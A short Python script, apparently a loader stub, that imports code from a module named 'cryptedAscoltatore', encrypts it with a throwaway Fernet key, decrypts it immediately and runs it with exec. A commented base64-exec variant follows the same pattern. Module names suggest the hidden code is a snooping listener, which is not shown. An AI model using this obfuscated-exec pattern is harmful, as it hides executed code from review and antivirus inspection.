from cryptography.fernet import Fernet
import base64
from ascoltatoreSeriale import ascoltatore as impiccione
from cryptedAscoltatore import code

#  your_code = base64.b64encode(b"""
#                               """)

# exec(base64.b64decode(your_code))


key = Fernet.generate_key()
encryption_type = Fernet(key)
encrypted_message = encryption_type.encrypt(code)

decrypted_message = encryption_type.decrypt(encrypted_message)

exec(decrypted_message)

